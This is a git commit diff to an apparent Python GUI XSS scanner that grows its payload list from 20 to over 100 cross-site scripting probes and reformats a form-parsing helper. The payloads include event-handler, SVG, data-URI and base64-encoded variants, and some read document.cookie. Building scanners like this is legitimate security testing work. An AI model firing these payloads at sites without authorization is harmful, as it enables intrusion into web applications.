dcdb09360a2b81ff9237406fd8a5f7382cdcbca5
chinnu75 <118835430+chinnu75@users.noreply.github.com>
2025-05-24 23:22:40 +0530

    Update xss_scanner_gui.py

--- xss_scanner_gui.py
+++ xss_scanner_gui.py
@@ -5,7 +5,7 @@ import tkinter as tk
 from tkinter import scrolledtext, messagebox
 import threading
 
-# 20 XSS Payloads
+# 100+ XSS Payloads
 payloads = [
     "<script>alert(1)</script>",
     "<img src=x onerror=alert(1)>",
@@ -26,7 +26,91 @@ payloads = [
     "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
     "<img src='x' onerror='alert(1)'>",
     "<div onpointerover='alert(1)'>Hover me</div>",
-    "<button onclick=alert(1)>Click</button>"
+    "<button onclick=alert(1)>Click</button>",
+
+    "<svg><desc><![CDATA[<script>alert(1)</script>]]></desc></svg>",
+    "<math href=\"javascript:alert(1)\">X</math>",
+    "<body onload=alert(String.fromCharCode(88,83,83))>",
+    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
+    "<img src=x onerror='javascript:alert(1)'>",
+    "<link rel='stylesheet' href='javascript:alert(1)'>",
+    "<style>@import 'javascript:alert(1)';</style>",
+    "<video src='javascript:alert(1)'>",
+    "<object type='text/x-scriptlet' data='javascript:alert(1)'>",
+    "<embed src='javascript:alert(1)'>",
+    "<script>window.onerror=alert</script>",
+    "<script>window.onload=alert</script>",
+    "<img src='x' onerror='alert(document.cookie)'>",
+    "<svg/onload=alert(1)>",
+    "<marquee onstart=alert(1)>",
+    "<base href=\"javascript:alert(1)//\">",
+    "<body onafterprint=alert(1)>",
+    "<img dynsrc='javascript:alert(1)'>",
+    "<input type='image' src='javascript:alert(1)'>",
+    "<video onerror=alert(1)>",
+    "<audio src='javascript:alert(1)'>",
+    "<script>setTimeout('alert(1)',1000)</script>",
+    "<iframe src='data:text/html,<script>alert(1)</script>'>",
+    "<img src=javascript:alert(1)>",
+    "<form action='javascript:alert(1)'><input type=submit>",
+    "<object data='data:text/html,<script>alert(1)</script>'>",
+    "<svg><script>alert(1)</script></svg>",
+    "<img onerror=alert('XSS') src='invalid'>",
+    "<details open ontoggle='alert(1)'>",
+    "<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>Click me</a>",
+    "<button formaction='javascript:alert(1)'>Click</button>",
+    "<img src=x onerror=alert('XSS')>",
+    "<input onblur=alert(1) autofocus>",
+    "<body onunload=alert(1)>",
+    "<object type='image/svg+xml' data='data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+'>",
+    "<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='indefinite' values='alert(1)'></animate></svg>",
+    "<script>location='javascript:alert(1)'</script>",
+    "<meta http-equiv='refresh' content='0;url=data:text/html,<script>alert(1)</script>'>",
+    "<script>alert(document.domain)</script>",
+    "<svg onload=prompt(1)>",
+    "<img src='x' onerror='confirm(1)'>",
+    "<body onload=confirm(1)>",
+    "<form onsubmit='alert(1)'><input type='submit'></form>",
+    "<svg><animate attributeName='xlink:href' begin='0s' dur='1s' repeatCount='indefinite' values='javascript:alert(1)'></animate></svg>",
+    "<img src=x onerror='javascript:alert(1)'>",
+    "<object data='javascript:alert(1)' type='text/html'>",
+    "<script>console.log('XSS')</script>",
+    "<video><source onerror=alert(1)></video>",
+    "<svg><set attributeName='onload' to='alert(1)' begin='0s'></set></svg>",
+    "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
+    "<svg><script xlink:href='data:text/javascript,alert(1)'></script></svg>",
+    "<math><maction xlink:href='javascript:alert(1)'>X</maction></math>",
+    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
+    "<svg><foreignObject onload='alert(1)'></foreignObject></svg>",
+    "<input type='text' value='<script>alert(1)</script>'>",
+    "<textarea><script>alert(1)</script></textarea>",
+    "<script>eval('alert(1)')</script>",
+    "<script>new Image().src='javascript:alert(1)';</script>",
+    "<svg><desc><![CDATA[<img src=x onerror=alert(1)>]]></desc></svg>",
+    "<img src='x' onerror='alert(1);'>",
+    "<svg><script><![CDATA[alert(1)]]></script></svg>",
+    "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' type='text/html'>",
+    "<svg><animateMotion onbegin='alert(1)' dur='1s' repeatCount='indefinite'></animateMotion></svg>",
+    "<details open ontoggle=\"alert('XSS')\">",
+    "<input autofocus onfocus=alert(1)>",
+    "<script>setTimeout(() => alert(1), 1000);</script>",
+    "<svg><set attributeName='onload' to='alert(1)'></set></svg>",
+    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
+    "<body onpageshow=alert(1)>",
+    "<img srcset=\"x 1x, javascript:alert(1) 2x\">",
+    "<script>document.location='javascript:alert(1)';</script>",
+    "<svg><animate attributeName='href' begin='0s' dur='1s' repeatCount='indefinite' values='javascript:alert(1)'></animate></svg>",
+    "<svg><set attributeName='onload' to='alert(1)' begin='0s'></set></svg>",
+    "<math href='javascript:alert(1)'>X</math>",
+    "<video onerror=alert(1)><source></video>",
+    "<img src='x' onerror='alert(1)'>",
+    "<svg><script>alert(document.cookie)</script></svg>",
+    "<input value=''><script>alert(1)</script>",
+    "<form action='javascript:alert(1)'><input type=submit></form>",
+    "<svg onload=alert(1)>",
+    "<script>window.location='javascript:alert(1)'</script>",
+    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
+    "<img src=x onerror=alert(1)>",
 ]
 
 # Extract forms
@@ -36,7 +120,11 @@ def get_forms(url):
 
 # Extract form details
 def get_form_details(form):
-    details = {"action": form.attrs.get("action"), "method": form.attrs.get("method", "get").lower(), "inputs": []}
+    details = {
+        "action": form.attrs.get("action"),
+        "method": form.attrs.get("method", "get").lower(),
+        "inputs": []
+    }
     for input_tag in form.find_all("input"):
         input_type = input_tag.attrs.get("type", "text")
         name = input_tag.attrs.get("name")
